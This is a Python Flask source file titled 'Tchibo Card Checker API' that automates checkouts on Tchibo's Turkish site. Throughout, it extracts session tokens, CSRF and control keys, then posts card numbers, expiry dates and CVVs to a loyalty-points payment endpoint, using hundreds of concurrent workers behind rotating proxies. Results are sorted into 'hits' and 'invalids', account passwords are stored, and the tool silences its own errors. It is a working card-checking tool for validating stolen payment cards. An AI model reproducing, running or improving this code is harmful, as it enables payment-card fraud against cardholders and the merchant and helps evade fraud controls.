"""
Tchibo Card Checker API
Author: skzyzskz
Version: 3.0.0
"""

import json
import os
import time
import threading
import logging
import random
import string
import asyncio
import re
import uuid
import urllib.parse
import sys
import warnings
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from concurrent.futures import ThreadPoolExecutor, as_completed
from proxy_manager import get_proxy_config, get_proxy_stats, reset_proxies
import httpx
import requests

warnings.filterwarnings('ignore')
import warnings
warnings.simplefilter("ignore")

class SuppressOutput:
    def __enter__(self):
        self.original_stderr = sys.stderr
        self.original_stdout = sys.stdout
        sys.stderr = open(os.devnull, 'w', encoding='utf-8')
        sys.stdout = open(os.devnull, 'w', encoding='utf-8')
        return self
    def __exit__(self, *args):
        sys.stderr.close()
        sys.stdout.close()
        sys.stderr = self.original_stderr
        sys.stdout = self.original_stdout

_builtins = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
_original_print = _builtins['print']
def silent_print(*args, **kwargs):
    msg = ' '.join(str(arg) for arg in args)
    msg_lower = msg.lower()
    if any(x in msg_lower for x in ['warning:', 'error:', 'traceback', 'typeerror', 'error submitting', 'error accessing']):
        return
    _original_print(*args, **kwargs)
_builtins['print'] = silent_print

__author__ = "skzyzskz"
__version__ = "3.0.0"

app = Flask(__name__)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('app.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.setLevel(logging.WARNING)

httpx_logger = logging.getLogger('httpx')
httpx_logger.setLevel(logging.WARNING)

class StatusEndpointFilter(logging.Filter):
    def filter(self, record):
        return '/get_status' not in record.getMessage() and '/status' not in record.getMessage()

werkzeug_logger.addFilter(StatusEndpointFilter())

PROXY_CONFIG_FILE = 'proxy_config.json'
SESSIONS_DB_FILE = 'sessions_database.json'
MAX_CONCURRENT_REQUESTS = 400

session_db_lock = threading.Lock()

PROXY_STATUS = {
    'is_set': False,
    'proxy_url': None,
    'last_test': None,
    'test_result': None,
    'rotation_enabled': True,
    'current_proxy': None
}

processing_status = {
    "is_processing": False,
    "total_cards": 0,
    "processed_cards": 0,
    "successful_cards": 0,
    "hits": 0,
    "invalids": 0,
}

results_queue = []
invalids_queue = []
results_lock = threading.Lock()

def _load_db_internal():
    try:
        if os.path.exists(SESSIONS_DB_FILE):
            with open(SESSIONS_DB_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if not content:
                    return {"sessions": [], "next_id": 1}
                return json.loads(content)
        return {"sessions": [], "next_id": 1}
    except Exception:
        return {"sessions": [], "next_id": 1}

def _save_db_internal(data):
    try:
        with open(SESSIONS_DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except Exception:
        return False

def load_sessions_database():
    with session_db_lock:
        return _load_db_internal()

def save_sessions_database(data):
    with session_db_lock:
        return _save_db_internal(data)

def get_all_sessions():
    db = load_sessions_database()
    return db.get("sessions", [])

def add_session(email, password, session_id, session_token, user_id, cookies=None):
    with session_db_lock:
        db = _load_db_internal()
        
        for existing in db["sessions"]:
            if existing["email"] == email:
                existing["session_id"] = session_id
                existing["session_token"] = session_token
                existing["last_used"] = datetime.now().isoformat()
                existing["is_active"] = True
                if _save_db_internal(db):
                    return True, "Updated"
                return False, "Failed"
        
        new_session = {
            "id": db["next_id"],
            "email": email,
            "password": password,
            "session_id": session_id,
            "session_token": session_token,
            "user_id": user_id,
            "cookies": cookies or {},
            "created_at": datetime.now().isoformat(),
            "last_used": datetime.now().isoformat(),
            "is_active": True
        }
        
        db["sessions"].append(new_session)
        db["next_id"] += 1
        
        if _save_db_internal(db):
            logger.info(f"+ {email} (ID: {new_session['id']})")
            return True, "OK"
        return False, "Failed"

def update_session(session_id, is_active=None):
    db = load_sessions_database()
    
    for session in db["sessions"]:
        if session["id"] == session_id:
            if is_active is not None:
                session["is_active"] = is_active
            session["updated_at"] = datetime.now().isoformat()
            
            if save_sessions_database(db):
                logger.info(f"^ {session['email']} (ID: {session_id})")
                return True, "OK"
            return False, "Failed"
    
    return False, "Not found"

def delete_session(session_id):
    db = load_sessions_database()
    
    for i, session in enumerate(db["sessions"]):
        if session["id"] == session_id:
            deleted = db["sessions"].pop(i)
            if save_sessions_database(db):
                logger.info(f"- {deleted['email']} (ID: {session_id})")
                return True, "OK"
            return False, "Failed"
    
    return False, "Not found"

def get_active_sessions():
    db = load_sessions_database()
    active = [s for s in db["sessions"] if s.get("is_active", True)]
    logger.info(f"{len(active)} sessions active")
    return active

import sys
import os
parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

with SuppressOutput():
    try:
        from tchibo_automation import TchiboPaymentAutomation as WorkingTchiboPaymentAutomation
        USE_WORKING_AUTOMATION = True
    except ImportError:
        USE_WORKING_AUTOMATION = False
        pass

class HttpxSessionWrapper:
    """Wrapper around httpx.Client that converts allow_redirects to follow_redirects"""
    def __init__(self, client):
        self._client = client
    
    @property
    def cookies(self):
        return self._client.cookies
    
    @cookies.setter
    def cookies(self, value):
        self._client.cookies = value
    
    def _convert_kwargs(self, kwargs):
        """Convert allow_redirects to follow_redirects and proxies to proxy"""
        if 'allow_redirects' in kwargs:
            kwargs['follow_redirects'] = kwargs.pop('allow_redirects')
        if 'proxies' in kwargs:
            proxies = kwargs.pop('proxies')
            if isinstance(proxies, dict):
                proxy_url = proxies.get('http') or proxies.get('https')
                if proxy_url:
                    kwargs['proxy'] = proxy_url
        return kwargs
    
    def get(self, url, **kwargs):
        with SuppressOutput():
            try:
                kwargs = self._convert_kwargs(kwargs)
                return self._client.get(url, **kwargs)
            except Exception:
                class MockResponse:
                    def __init__(self, url_val):
                        self.status_code = 500
                        self.text = ''
                        self.content = b''
                        self.url = url_val
                return MockResponse(url)
    
    def post(self, url, **kwargs):
        with SuppressOutput():
            try:
                kwargs = self._convert_kwargs(kwargs)
                return self._client.post(url, **kwargs)
            except Exception:
                class MockResponse:
                    def __init__(self, url_val):
                        self.status_code = 500
                        self.text = ''
                        self.content = b''
                        self.url = url_val
                return MockResponse(url)
    
    def put(self, url, **kwargs):
        with SuppressOutput():
            try:
                kwargs = self._convert_kwargs(kwargs)
                return self._client.put(url, **kwargs)
            except Exception:
                class MockResponse:
                    def __init__(self, url_val):
                        self.status_code = 500
                        self.text = ''
                        self.content = b''
                        self.url = url_val
                return MockResponse(url)
    
    def delete(self, url, **kwargs):
        with SuppressOutput():
            try:
                kwargs = self._convert_kwargs(kwargs)
                return self._client.delete(url, **kwargs)
            except Exception:
                class MockResponse:
                    def __init__(self, url_val):
                        self.status_code = 500
                        self.text = ''
                        self.content = b''
                        self.url = url_val
                return MockResponse(url)
    
    def patch(self, url, **kwargs):
        with SuppressOutput():
            try:
                kwargs = self._convert_kwargs(kwargs)
                return self._client.patch(url, **kwargs)
            except Exception:
                class MockResponse:
                    def __init__(self, url_val):
                        self.status_code = 500
                        self.text = ''
                        self.content = b''
                        self.url = url_val
                return MockResponse(url)
    
    def head(self, url, **kwargs):
        with SuppressOutput():
            try:
                kwargs = self._convert_kwargs(kwargs)
                return self._client.head(url, **kwargs)
            except Exception:
                class MockResponse:
                    def __init__(self, url_val):
                        self.status_code = 500
                        self.text = ''
                        self.content = b''
                        self.url = url_val
                return MockResponse(url)
    
    def options(self, url, **kwargs):
        with SuppressOutput():
            try:
                kwargs = self._convert_kwargs(kwargs)
                return self._client.options(url, **kwargs)
            except Exception:
                class MockResponse:
                    def __init__(self, url_val):
                        self.status_code = 500
                        self.text = ''
                        self.content = b''
                        self.url = url_val
                return MockResponse(url)
    
    def request(self, method, url, **kwargs):
        with SuppressOutput():
            try:
                kwargs = self._convert_kwargs(kwargs)
                return self._client.request(method, url, **kwargs)
            except Exception:
                class MockResponse:
                    def __init__(self, url_val):
                        self.status_code = 500
                        self.text = ''
                        self.content = b''
                        self.url = url_val
                return MockResponse(url)
    
    def close(self):
        try:
            return self._client.close()
        except Exception:
            pass
    
    def __getattr__(self, name):
        try:
            return getattr(self._client, name)
        except Exception:
            return None

if USE_WORKING_AUTOMATION:
    class TchiboPaymentAutomation(WorkingTchiboPaymentAutomation):
        """Tchibo payment session automation with proxy support"""
        
        def __init__(self, base_url="https://psp.tchibo.com.tr", main_site_url="https://www.tchibo.com.tr", proxy=None):
            with SuppressOutput():
                try:
                    super().__init__(base_url, main_site_url)
                except Exception:
                    pass
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Connection': 'keep-alive',
            }
            
            proxy_for_httpx = None
            if proxy:
                if isinstance(proxy, dict):
                    proxy_for_httpx = proxy.get('http') or proxy.get('https')
                elif isinstance(proxy, str):
                    if proxy.startswith('http://') or proxy.startswith('https://'):
                        proxy_for_httpx = proxy
                    else:
                        parts = proxy.split(':')
                        if len(parts) == 4:
                            host, port, user, password = parts
                            proxy_url = f"http://{user}:{password}@{host}:{port}"
                            proxy_for_httpx = proxy_url
                        elif len(parts) == 2:
                            host, port = parts
                            proxy_url = f"http://{host}:{port}"
                            proxy_for_httpx = proxy_url
            
            old_session = None
            cookies = {}
            if hasattr(self, 'session'):
                old_session = self.session
                try:
                    if hasattr(old_session, 'cookies'):
                        for cookie in old_session.cookies:
                            try:
                                if hasattr(cookie, 'name') and hasattr(cookie, 'value'):
                                    cookies[cookie.name] = cookie.value
                            except:
                                pass
                except:
                    try:
                        if hasattr(old_session, 'cookies'):
                            for name, value in old_session.cookies.items():
                                cookies[name] = value
                    except:
                        pass
                
                try:
                    if hasattr(old_session, 'close'):
                        old_session.close()
                except Exception:
                    pass
            
            try:
                client_kwargs = {
                    'headers': headers,
                    'follow_redirects': True,
                    'cookies': cookies,
                    'timeout': 30.0
                }
                if proxy_for_httpx:
                    client_kwargs['proxy'] = proxy_for_httpx
                httpx_client = httpx.Client(**client_kwargs)
                self.session = HttpxSessionWrapper(httpx_client)
                self.proxy_dict = proxy_for_httpx
            except Exception:
                httpx_client = httpx.Client(headers=headers, follow_redirects=True, cookies=cookies, timeout=30.0)
                self.session = HttpxSessionWrapper(httpx_client)
                self.proxy_dict = None
        
        def get(self, url, **kwargs):
            """Override get to add proxy and convert allow_redirects to follow_redirects"""
            if 'allow_redirects' in kwargs:
                kwargs['follow_redirects'] = kwargs.pop('allow_redirects')
            if self.proxy_dict and 'proxy' not in kwargs:
                kwargs['proxy'] = self.proxy_dict
            return self.session.get(url, **kwargs)
        
        def post(self, url, **kwargs):
            """Override post to add proxy and convert allow_redirects to follow_redirects"""
            if 'allow_redirects' in kwargs:
                kwargs['follow_redirects'] = kwargs.pop('allow_redirects')
            if self.proxy_dict and 'proxy' not in kwargs:
                kwargs['proxy'] = self.proxy_dict
            return self.session.post(url, **kwargs)
        
        def put(self, url, **kwargs):
            """Override put to add proxy and convert allow_redirects to follow_redirects"""
            if 'allow_redirects' in kwargs:
                kwargs['follow_redirects'] = kwargs.pop('allow_redirects')
            if self.proxy_dict and 'proxy' not in kwargs:
                kwargs['proxy'] = self.proxy_dict
            return self.session.put(url, **kwargs)
        
        def request(self, method, url, **kwargs):
            """Override request to add proxy and convert allow_redirects to follow_redirects"""
            if 'allow_redirects' in kwargs:
                kwargs['follow_redirects'] = kwargs.pop('allow_redirects')
            if self.proxy_dict and 'proxy' not in kwargs:
                kwargs['proxy'] = self.proxy_dict
            return self.session.request(method, url, **kwargs)
        
        def initialize_session(self, payment_token=None, payment_secret=None):
            """Initialize session"""
            import time
            start_time = time.time()
            
            try:
                if payment_token and payment_secret:
                    self.payment_token = payment_token
                    self.payment_secret = payment_secret
                    payment_url = f"{self.base_url}/VPayment/VPayStepOptions_4?Token={payment_token}&Secret={urllib.parse.quote(payment_secret)}&dtype=4"
                    response = self.session.get(payment_url, follow_redirects=True, timeout=15)
                else:
                    logger.info(f"initialize_session: Starting submit_order...")
                    redirect_url = self._fast_submit_order()
                    
                    if not redirect_url:
                        logger.info(f"initialize_session: No redirect URL from submit_order")
                        return False
                    
                    logger.info(f"initialize_session: Following redirect: {redirect_url[:80]}...")
                    self.payment_token, self.payment_secret = self._fast_follow_redirect(redirect_url)
                    
                    if not self.payment_token or not self.payment_secret:
                        logger.info(f"initialize_session: No Token/Secret from redirect")
                        return False
                    
                    logger.info(f"initialize_session: Got Token={self.payment_token[:20]}... Secret={self.payment_secret[:20]}...")
                    payment_url = f"{self.base_url}/VPayment/VPayStepOptions_4?Token={self.payment_token}&Secret={urllib.parse.quote(self.payment_secret)}&dtype=4"
                    response = self.session.get(payment_url, follow_redirects=True, timeout=15)
                
                if response.status_code != 200:
                    logger.debug(f"initialize_session: Bad status {response.status_code}")
                    return False
                
                response_url_str = str(response.url)
                if 'VPayError' in response_url_str or 'error' in response_url_str.lower():
                    logger.debug(f"initialize_session: Redirected to error page")
                    return False
                
                payment_page_response = response
                
                data = payment_page_response.content
                start = data.find(b'ctrlKey" value="') + 16
                end = data.find(b'"', start)
                if start > 16 and end > start:
                    self.ctrl_key = data[start:end].decode().strip()
                
                pg_start = data.find(b'pgProcessKey" value="') + 21
                pg_end = data.find(b'"', pg_start)
                if pg_start > 21 and pg_end > pg_start:
                    self.pg_process_key = data[pg_start:pg_end].decode().strip()
                
                self.payment_xcsrf = self.session.cookies.get('PaymentXCSRF')
                
                if not self.payment_xcsrf:
                    html = payment_page_response.text
                    xcsrf_match = re.search(r'PaymentXCSRF["\']?\s*[=:]\s*["\']([^"\']+)', html)
                    if xcsrf_match:
                        self.payment_xcsrf = xcsrf_match.group(1)
                
                elapsed = time.time() - start_time
                logger.debug(f"initialize_session: Completed in {elapsed:.1f}s - ctrl_key={bool(self.ctrl_key)}, xcsrf={bool(self.payment_xcsrf)}")
                return bool(self.ctrl_key and self.pg_process_key and self.payment_xcsrf)
                
            except Exception as e:
                logger.debug(f"initialize_session: Exception: {e}")
                return False
        
        def _fast_submit_order(self):
            """Submit order"""
            try:
                checkout_frontend_url = f"{self.main_site_url}/service/checkoutfrontend/checkout"
                
                logger.info(f"_fast_submit_order: Visiting checkout frontend...")
                try:
                    frontend_resp = self.session.get(checkout_frontend_url, timeout=10, follow_redirects=True)
                    logger.info(f"_fast_submit_order: Frontend response: {frontend_resp.status_code}")
                    if frontend_resp.status_code != 200:
                        return None
                except Exception as e:
                    logger.info(f"_fast_submit_order: Frontend error: {e}")
                    return None
                
                cookie_names = list(self.session.cookies.keys()) if hasattr(self.session.cookies, 'keys') else []
                logger.info(f"_fast_submit_order: Cookies before API: {cookie_names}")
                
                checkout_api_url = f"{self.main_site_url}/service/checkout/api/checkout"
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Referer': checkout_frontend_url,
                    'X-App-Platform': 'BROWSER',
                    'X-Hunter-CSRF': 'x',
                    'X-Hunter-Site': 'TR',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                }
                
                logger.info(f"_fast_submit_order: Getting checkout data...")
                response = self.session.get(checkout_api_url, headers=headers, timeout=8)
                if response.status_code != 200:
                    logger.info(f"_fast_submit_order: checkout API returned {response.status_code}")
                    try:
                        error_text = response.text[:200]
                        logger.info(f"_fast_submit_order: Error response: {error_text}")
                    except:
                        pass
                    return None
                
                data = response.json()
                checkout_data = data.get('checkoutData', {})
                cart_identifier = checkout_data.get('cartIdentifier')
                customer_identifier = checkout_data.get('customerIdentifier')
                
                logger.info(f"_fast_submit_order: cartId={bool(cart_identifier)}, customerId={bool(customer_identifier)}")
                
                if not cart_identifier or not customer_identifier:
                    logger.info(f"_fast_submit_order: Missing identifiers")
                    return None
                
                customer_data = checkout_data.get('customerData', {})
                if not customer_data.get('selectedAddressId') and not customer_data.get('addresses'):
                    address_data = {
                        "addressId": str(uuid.uuid4()),
                        "addressType": "INVOICE_ADDRESS",
                        "salutation": "MR",
                        "firstName": "Test",
                        "lastName": "User",
                        "phoneNumber": "5551234567",
                        "countryCode": "TR",
                        "postalTown": "Istanbul",
                        "postalCode": "34000",
                        "district": "Kadikoy",
                        "streetAddress": "Test Street 123",
                    }
                    address_url = f"{self.main_site_url}/service/checkout/api/address/upsert?setAsSelected=true"
                    addr_headers = {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json',
                        'X-App-Platform': 'BROWSER',
                        'X-Hunter-CSRF': 'x',
                        'X-Hunter-Site': 'TR',
                        'Referer': f"{self.main_site_url}/service/checkoutfrontend/checkout",
                    }
                    self.session.put(address_url, json=address_data, headers=addr_headers, timeout=10)
                
                if not customer_data.get('email'):
                    email_payload = {
                        "commonRegistrationData": {
                            "salutation": "MR",
                            "firstname": "Test",
                            "lastname": "User",
                            "email": f"test{int(time.time())}@example.com",
                        },
                        "consents": {"guest": True}
                    }
                    register_url = f"{self.main_site_url}/service/checkout/api/register"
                    self.session.put(register_url, json=email_payload, headers=addr_headers, timeout=10)
                
                payment_data = checkout_data.get('paymentData', {})
                if not payment_data.get('selectedMethod') or payment_data.get('selectedMethod') == 'UNKNOWN':
                    payment_url = f"{self.main_site_url}/service/checkout/api/paymentMethod"
                    payment_payload = {"paymentMethod": "CREDITCARD"}
                    self.session.put(payment_url, json=payment_payload, headers=addr_headers, timeout=10)
                
                order_url = f"{self.main_site_url}/service/checkout/api/order"
                order_payload = {
                    "cartIdentifier": cart_identifier,
                    "customerIdentifier": customer_identifier,
                }
                order_headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-App-Platform': 'BROWSER',
                    'X-Hunter-CSRF': 'x',
                    'X-Hunter-Site': 'TR',
                    'Referer': f"{self.main_site_url}/service/checkoutfrontend/checkout",
                }
                
                logger.info(f"_fast_submit_order: Submitting order...")
                order_response = self.session.put(order_url, json=order_payload, headers=order_headers, timeout=15)
                
                logger.info(f"_fast_submit_order: Order response: {order_response.status_code}")
                
                if order_response.status_code == 200:
                    order_data = order_response.json()
                    redirect_url = order_data.get('redirectUrl')
                    if redirect_url:
                        logger.info(f"_fast_submit_order: Got redirect URL!")
                        return redirect_url
                    else:
                        logger.info(f"_fast_submit_order: No redirectUrl in response: {list(order_data.keys())}")
                else:
                    try:
                        error_data = order_response.json()
                        logger.info(f"_fast_submit_order: Order error: {error_data}")
                    except:
                        logger.info(f"_fast_submit_order: Order error (non-json): {order_response.text[:200]}")
                
                return None
                
            except Exception as e:
                logger.debug(f"_fast_submit_order: Exception: {e}")
                return None
        
        def _fast_follow_redirect(self, redirect_url):
            """Follow redirect and extract Token and Secret"""
            try:
                if 'Token=' in redirect_url and 'Secret=' in redirect_url:
                    token_match = re.search(r'Token=([^&]+)', redirect_url)
                    secret_match = re.search(r'Secret=([^&]+)', redirect_url)
                    if token_match and secret_match:
                        token = token_match.group(1)
                        secret = urllib.parse.unquote(secret_match.group(1))
                        return token, secret
                
                response = self.session.get(redirect_url, follow_redirects=True, timeout=15)
                final_url = str(response.url)
                
                if 'Token=' in final_url and 'Secret=' in final_url:
                    token_match = re.search(r'Token=([^&]+)', final_url)
                    secret_match = re.search(r'Secret=([^&]+)', final_url)
                    if token_match and secret_match:
                        token = token_match.group(1)
                        secret = urllib.parse.unquote(secret_match.group(1))
                        return token, secret
                
                return None, None
            except Exception as e:
                logger.debug(f"_fast_follow_redirect: Exception: {e}")
                return None, None
        
        def refresh_ctrl_key(self):
            """Refresh ctrlKey"""
            if not self.payment_token or not self.payment_secret:
                logger.debug(f"refresh_ctrl_key: Missing token or secret (token={bool(self.payment_token)}, secret={bool(self.payment_secret)})")
                return False
            
            payment_url = f"{self.base_url}/VPayment/VPayStepOptions_4?Token={self.payment_token}&Secret={urllib.parse.quote(self.payment_secret)}&dtype=4"
            
            try:
                response = self.session.get(payment_url, timeout=5, follow_redirects=True)
                
                if response.status_code != 200:
                    response_url_str = str(response.url)
                    logger.debug(f"refresh_ctrl_key: Status code {response.status_code}, URL: {response_url_str[:100]}")
                    return False
                
                response_url_str = str(response.url)
                if 'VPayError' in response_url_str or 'error' in response_url_str.lower():
                    logger.debug(f"refresh_ctrl_key: Redirected to error page: {response_url_str[:100]}")
                    return False
                
                data = response.content
                
                if len(data) < 1000:
                    logger.debug(f"refresh_ctrl_key: Response too short ({len(data)} bytes)")
                    return False
                
                start = data.find(b'ctrlKey" value="') + 16
                end = data.find(b'"', start)
                
                if start > 16 and end > start:
                    self.ctrl_key = data[start:end].decode().strip()
                    
                    pg_start = data.find(b'pgProcessKey" value="') + 21
                    pg_end = data.find(b'"', pg_start)
                    if pg_start > 21 and pg_end > pg_start:
                        self.pg_process_key = data[pg_start:pg_end].decode().strip()
                    
                    logger.debug(f"refresh_ctrl_key: Successfully extracted ctrlKey (length: {len(self.ctrl_key)})")
                    return True
                
                logger.debug(f"refresh_ctrl_key: ctrlKey not found (start={start}, end={end}, data_len={len(data)})")
                return False
            except Exception as e:
                logger.debug(f"refresh_ctrl_key exception: {e}")
                import traceback
                logger.debug(traceback.format_exc())
                return False
        
        def get_loyalty_point_no_refresh(self, card_number, card_month, card_year, card_holder="", pos_id=0, card_id=0, sc=0):
            """Call pg_getloyaltypoint endpoint"""
            if not self.ctrl_key:
                self.refresh_ctrl_key()
            
            params = self.get_random_url_params()
            url = f"{self.base_url}/VPayment/AjaxCall{params}"
            
            csrf_token = self.session.cookies.get('PaymentXCSRF')
            if not csrf_token:
                csrf_token = self.payment_xcsrf
            
            if not csrf_token:
                dummy_response = self.session.get(self.base_url + '/')
                csrf_token = self.session.cookies.get('PaymentXCSRF')
            
            if not csrf_token:
                raise Exception("PaymentXCSRF token required but not found")
            
            data = {
                'Shopizz_Ajax_Action_Public': 'pg_getloyaltypoint',
                'ctrlKey': self.ctrl_key,
                'lp_cardnum': card_number,
                'lp_cardholder': card_holder,
                'lp_cardmonth': str(card_month),
                'lp_cardyear': str(card_year),
                'lp_posid': str(pos_id),
                'lp_cardid': str(card_id),
                'lp_sc': str(sc),
                'pgProcessKey': self.pg_process_key if self.pg_process_key else '',
                'PaymentXCSRF': csrf_token
            }
            
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/",
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
            }
            
            cookie_parts = []
            for cookie in self.session.cookies:
                if hasattr(cookie, 'name') and hasattr(cookie, 'value'):
                    cookie_parts.append(f"{cookie.name}={cookie.value}")
            
            critical_cookies = {}
            if hasattr(self, 'payment_session_id') and self.payment_session_id:
                critical_cookies['Payment.SessionId'] = self.payment_session_id
            if hasattr(self, 'payment_xcsrf') and self.payment_xcsrf:
                critical_cookies['PaymentXCSRF'] = self.payment_xcsrf
            if hasattr(self, 'loadbalancepsp') and self.loadbalancepsp:
                critical_cookies['loadbalancepsp'] = self.loadbalancepsp
            if hasattr(self, 'l_fm_mid') and self.l_fm_mid:
                critical_cookies['l-fm-mid'] = self.l_fm_mid
            ts_cookie = self.session.cookies.get('TS01282d4a')
            if ts_cookie:
                critical_cookies['TS01282d4a'] = ts_cookie
            
            cookie_dict = {}
            for part in cookie_parts:
                if '=' in part:
                    name, value = part.split('=', 1)
                    cookie_dict[name] = value
            cookie_dict.update(critical_cookies)
            
            final_cookie_parts = [f"{name}={value}" for name, value in cookie_dict.items()]
            
            if final_cookie_parts:
                headers['Cookie'] = '; '.join(final_cookie_parts)
            
            response = self.session.post(url, data=data, headers=headers)
            response.raise_for_status()
            
            result_text = response.text.strip()
            if result_text.startswith('"') and result_text.endswith('"'):
                result_text = result_text[1:-1]
            
            result_text = result_text.replace('\\u0022', '"').replace('\\/', '/')
            return json.loads(result_text)

else:
    class TchiboPaymentAutomation:
        """Tchibo payment session automation"""
        
        def __init__(self, base_url="https://psp.tchibo.com.tr", main_site_url="https://www.tchibo.com.tr", proxy=None):
            self.base_url = base_url
            self.main_site_url = main_site_url
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Connection': 'keep-alive',
            }
            
            proxy_for_httpx = None
            if proxy:
                if isinstance(proxy, dict):
                    proxy_for_httpx = proxy.get('http') or proxy.get('https')
                elif isinstance(proxy, str):
                    if proxy.startswith('http://') or proxy.startswith('https://'):
                        proxy_for_httpx = proxy
                    else:
                        parts = proxy.split(':')
                        if len(parts) == 4:
                            host, port, user, password = parts
                            proxy_for_httpx = f"http://{user}:{password}@{host}:{port}"
            
            client_kwargs = {
                'headers': headers,
                'follow_redirects': True
            }
            if proxy_for_httpx:
                client_kwargs['proxy'] = proxy_for_httpx
            self.session = httpx.Client(**client_kwargs)
            
            self.ctrl_key = None
            self.pg_process_key = None
            self.payment_token = None
            self.payment_secret = None
            self.payment_xcsrf = None
            
            self.proxy_dict = proxy_for_httpx
        
        def initialize_session(self, payment_token=None, payment_secret=None):
            """Initialize session"""
            return False
        
        def refresh_ctrl_key(self):
            """Refresh ctrlKey"""
            return False

class TchiboWorker:
    """Single worker with its own session and cookies"""
    
    def __init__(self, worker_id, proxy=None):
        self.worker_id = worker_id
        self.proxy = proxy
        self.token = None
        self.secret = None
        self.payment_xcsrf = None
        self.ctrl_key = None
        self.pg_process_key = None
        self.cookies_dict = {}
        self.base_url = "https://psp.tchibo.com.tr"
        self.automation = None
    
    def _store_result_realtime(self, result, parts):
        """Store a card result in the global queue"""
        global results_queue, invalids_queue, processing_status, results_lock
        
        try:
            card_number = parts[0] if len(parts) > 0 else ''
            month = parts[1] if len(parts) > 1 else ''
            year = parts[2] if len(parts) > 2 else ''
            cvv = parts[3] if len(parts) > 3 else ''
            
            points = result.get('points', 0)
            is_success = result.get('success', False)
            error = result.get('error', '')
            
            card_data = {
                'card_number': card_number,
                'month': month,
                'year': year,
                'cvv': cvv,
                'points': points,
                'error': error if not is_success else ''
            }
            
            with results_lock:
                if is_success and points > 0:
                    results_queue.append(card_data)
                    processing_status["hits"] += 1
                else:
                    invalids_queue.append(card_data)
                    processing_status["invalids"] += 1
        except Exception as e:
            logger.error(f"Worker {self.worker_id}: Error storing result: {e}")
    
    def init_session(self):
        """Initialize session"""
        import time
        import sys
        import os
        start_time = time.time()
        logger.info(f"Worker {self.worker_id}: Starting init_session (using working automation)...")
        
        proxy_for_requests = None
        if self.proxy:
            if isinstance(self.proxy, dict):
                proxy_for_requests = self.proxy.get('http') or self.proxy.get('https')
            elif isinstance(self.proxy, str):
                if self.proxy.startswith('http://') or self.proxy.startswith('https://'):
                    proxy_for_requests = self.proxy
                else:
                    parts = self.proxy.split(':')
                    if len(parts) == 4:
                        host, port, user, password = parts
                        proxy_for_requests = f"http://{user}:{password}@{host}:{port}"
        
        try:
            parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            if parent_dir not in sys.path:
                sys.path.insert(0, parent_dir)
            
            from tchibo_automation import TchiboPaymentAutomation as WorkingAutomation
            
            logger.info(f"Worker {self.worker_id}: [{time.time()-start_time:.1f}s] Creating working automation...")
            self.automation = WorkingAutomation(proxy=proxy_for_requests)
            
            logger.info(f"Worker {self.worker_id}: [{time.time()-start_time:.1f}s] Adding to cart...")
            try:
                self.automation.add_to_cart('233722167222', quantity=1)
                logger.info(f"Worker {self.worker_id}: [{time.time()-start_time:.1f}s] Cart added")
            except Exception as e:
                logger.info(f"Worker {self.worker_id}: [{time.time()-start_time:.1f}s] Cart error: {e}")
            
            logger.info(f"Worker {self.worker_id}: [{time.time()-start_time:.1f}s] Initializing payment...")
            if self.automation.initialize_session():
                if (self.automation.payment_token and 
                    self.automation.payment_secret and 
                    self.automation.payment_xcsrf):
                    
                    self.token = self.automation.payment_token
                    self.secret = self.automation.payment_secret
                    self.payment_xcsrf = self.automation.payment_xcsrf
                    self.ctrl_key = getattr(self.automation, 'ctrl_key', None)
                    self.pg_process_key = getattr(self.automation, 'pg_process_key', None)
                    
                    self.cookies_dict = {}
                    try:
                        for name, value in self.automation.session.cookies.items():
                            self.cookies_dict[name] = value
                    except:
                        pass
                    
                    if self.automation.payment_xcsrf:
                        self.cookies_dict['PaymentXCSRF'] = self.automation.payment_xcsrf
                    
                    elapsed = time.time() - start_time
                    logger.info(f"Worker {self.worker_id}: ✅ SUCCESS in {elapsed:.1f}s! Cookies: {len(self.cookies_dict)}")
                    return True
            
            elapsed = time.time() - start_time
            logger.info(f"Worker {self.worker_id}: ❌ FAILED in {elapsed:.1f}s - missing credentials")
            return False
            
        except Exception as e:
            elapsed = time.time() - start_time
            logger.info(f"Worker {self.worker_id}: ❌ Exception in {elapsed:.1f}s: {e}")
            return False
    
